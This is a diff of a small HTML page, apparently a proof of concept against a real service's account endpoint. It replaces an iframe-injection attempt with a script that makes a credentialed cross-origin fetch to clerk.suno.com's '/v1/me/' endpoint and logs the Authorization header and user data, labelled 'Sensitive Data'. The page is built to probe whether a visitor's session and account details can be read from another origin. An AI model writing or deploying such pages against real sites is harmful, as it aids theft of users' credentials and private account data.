@@ -6,37 +6,16 @@
     <title>Fetch from Iframe</title>
 </head>
 <body>
-    <iframe id="exampleIframe" src="https://webapp.chatgpt4google.com/api/user/me" width="600" height="400"></iframe>
-
-<!--     <script>
-        const iframe = document.getElementById('exampleIframe');
-
-        iframe.onload = function() {
-            const innerDoc = iframe.contentDocument || iframe.contentWindow.document;
-            
-            if (innerDoc) {
-                const script = innerDoc.createElement('script');
-                
-                script.textContent = `
-                    fetch('https://clerk.suno.com/v1/me/', {
-                        method: 'GET',
-                        credentials: 'include'
-                    })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error('Network response was not ok');
-                        }
-                        return response.json();
-                    })
-                    .then(data => console.log(data))
-                    .catch(error => console.error('Ошибка:', error));
-                `;
-
-                innerDoc.body.appendChild(script);
-            } else {
-                console.error('Не удалось получить доступ к contentDocument');
-            }
-        };
-    </script> -->
+   <script>
+       fetch("https://clerk.suno.com/v1/me/", {
+    method: "GET",
+    credentials: "include"
+})
+.then(response => {
+    console.log("Authorization:", response.headers.get("Authorization"));  // Access exposed Authorization header
+    return response.json();
+})
+.then(data => console.log("Sensitive Data:", data));
+   </script>
 </body>
 </html>
